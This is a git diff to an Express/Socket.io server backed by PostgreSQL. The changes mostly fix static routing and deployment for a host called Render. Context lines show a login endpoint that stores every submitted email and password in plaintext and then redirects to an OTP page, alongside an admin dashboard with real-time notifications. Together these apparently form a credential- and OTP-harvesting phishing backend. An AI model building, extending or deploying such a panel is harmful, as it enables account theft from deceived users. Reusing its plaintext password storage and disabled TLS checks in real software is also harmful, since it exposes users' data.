@@ -7,6 +7,7 @@ const socketIo = require('socket.io');
 const path = require('path');
 const cors = require('cors');
 const crypto = require('crypto');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -21,37 +22,101 @@ const io = socketIo(server, {
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
-// Database configuration - Final working version for Neon
+
+// Serve static files with absolute paths - FIXED for Render
+const publicPath = path.join(__dirname, 'public');
+console.log('📁 Serving static files from:', publicPath);
+
+// Check if public directory exists
+if (!fs.existsSync(publicPath)) {
+  console.error('❌ Public directory not found at:', publicPath);
+  console.error('📝 Current directory:', __dirname);
+  console.error('📝 Files in current directory:', fs.readdirSync(__dirname));
+} else {
+  console.log('✅ Public directory found');
+  
+  // List contents for debugging
+  try {
+    const files = fs.readdirSync(publicPath);
+    console.log('📁 Public directory contents:', files);
+    
+    if (fs.existsSync(path.join(publicPath, 'users'))) {
+      console.log('📁 Users directory contents:', fs.readdirSync(path.join(publicPath, 'users')));
+    }
+    if (fs.existsSync(path.join(publicPath, 'admin'))) {
+      console.log('📁 Admin directory contents:', fs.readdirSync(path.join(publicPath, 'admin')));
+    }
+  } catch (e) {
+    console.log('Could not list directories:', e.message);
+  }
+}
+
+// Serve static files
+app.use(express.static(publicPath));
+
+// Explicit routes for HTML pages
+app.get('/', (req, res) => {
+  res.sendFile(path.join(publicPath, 'users/login.html'));
+});
+
+app.get('/users/login', (req, res) => {
+  res.sendFile(path.join(publicPath, 'users/login.html'));
+});
+
+app.get('/users/login.html', (req, res) => {
+  res.sendFile(path.join(publicPath, 'users/login.html'));
+});
+
+app.get('/users/otp', (req, res) => {
+  res.sendFile(path.join(publicPath, 'users/otp.html'));
+});
+
+app.get('/users/otp.html', (req, res) => {
+  res.sendFile(path.join(publicPath, 'users/otp.html'));
+});
+
+app.get('/admin', (req, res) => {
+  res.sendFile(path.join(publicPath, 'admin/index.html'));
+});
+
+app.get('/admin/index', (req, res) => {
+  res.sendFile(path.join(publicPath, 'admin/index.html'));
+});
+
+app.get('/admin/index.html', (req, res) => {
+  res.sendFile(path.join(publicPath, 'admin/index.html'));
+});
+
+app.get('/admin/dashboard', (req, res) => {
+  res.sendFile(path.join(publicPath, 'admin/dashboard.html'));
+});
+
+app.get('/admin/dashboard.html', (req, res) => {
+  res.sendFile(path.join(publicPath, 'admin/dashboard.html'));
+});
+
+// Database configuration - Optimized for Neon
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: {
-    rejectUnauthorized: false,
-    sslmode: 'require'
+    rejectUnauthorized: false
   },
-  connectionTimeoutMillis: 30000,
+  connectionTimeoutMillis: 10000,
   idleTimeoutMillis: 30000,
   max: 20,
   keepAlive: true,
-  keepAliveInitialDelayMillis: 10000,
-  statement_timeout: 10000
+  keepAliveInitialDelayMillis: 10000
 });
 
-pool.on('error', (err, client) => {
-  console.error('❌ Unexpected error on idle client', err.message);
-  process.exit(-1);
+pool.on('error', (err) => {
+  console.error('❌ Unexpected database pool error:', err.message);
 });
 
 // Test database connection immediately
 pool.connect((err, client, release) => {
   if (err) {
     console.error('❌ Error connecting to database:', err.message);
-    console.error('📝 Please check:');
-    console.error('   1. Your internet connection and firewall');
-    console.error('   2. DATABASE_URL in .env file is correct');
-    console.error('   3. Neon database is accessible from your network');
-    console.error('🔍 Current DATABASE_URL:', process.env.DATABASE_URL ? 'Set ✓' : 'Not set ✗');
-    process.exit(1);
+    console.error('📝 DATABASE_URL is:', process.env.DATABASE_URL ? 'Set ✓' : 'Not set ✗');
   } else {
     console.log('✅ Successfully connected to Neon PostgreSQL database');
     release();
@@ -150,10 +215,6 @@ async function initializeDatabase() {
     return true;
   } catch (error) {
     console.error('❌ Database initialization error:', error.message);
-    console.error('Please check:');
-    console.error('1. Your internet connection');
-    console.error('2. DATABASE_URL in .env file is correct');
-    console.error('3. Neon database is accessible');
     return false;
   }
 }
@@ -175,8 +236,8 @@ app.post('/api/users/login', async (req, res) => {
     }
 
     // Save user to database
-    const result = await pool.query(
-      'INSERT INTO users (email, password) VALUES ($1, $2) ON CONFLICT (email) DO UPDATE SET password = EXCLUDED.password RETURNING id',
+    await pool.query(
+      'INSERT INTO users (email, password) VALUES ($1, $2) ON CONFLICT (email) DO UPDATE SET password = EXCLUDED.password',
       [email, password]
     );
 
@@ -225,7 +286,7 @@ app.post('/api/users/login', async (req, res) => {
             font-weight: bold;
           }
         </style>
-        <meta http-equiv="refresh" content="3;url=/users/otp.html?email=${encodeURIComponent(email)}">
+        <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
       </head>
       <body>
         <div class="loading-container">
@@ -405,9 +466,9 @@ app.use((err, req, res, next) => {
   res.status(500).json({ error: 'Something went wrong!' });
 });
 
-// 404 handler
-app.use((req, res) => {
-  res.status(404).json({ error: 'Endpoint not found' });
+// 404 handler for API routes
+app.use('/api/*', (req, res) => {
+  res.status(404).json({ error: 'API endpoint not found' });
 });
 
 // Initialize database and start server
@@ -415,18 +476,17 @@ const PORT = process.env.PORT || 3000;
 
 initializeDatabase().then((success) => {
   if (success) {
-    server.listen(PORT, () => {
+    server.listen(PORT, '0.0.0.0', () => {
       console.log('\n🚀 Server started successfully!');
       console.log(`📡 Server running on port ${PORT}`);
-      console.log(`🔗 User login: http://localhost:${PORT}/users/login.html`);
-      console.log(`🔗 Admin login: http://localhost:${PORT}/admin/index.html`);
-      console.log(`🔗 Health check: http://localhost:${PORT}/api/health`);
-      console.log(`🔗 Test database: http://localhost:${PORT}/api/test-db`);
+      console.log(`🔗 User login: /users/login`);
+      console.log(`🔗 Admin login: /admin`);
+      console.log(`🔗 Health check: /api/health`);
+      console.log(`🔗 Test database: /api/test-db`);
       console.log('\n📢 Socket.io server is ready for real-time notifications\n');
     });
   } else {
     console.log('\n❌ Server startup failed due to database connection issues');
-    console.log('Please fix the database connection and restart the server');
     process.exit(1);
   }
 });
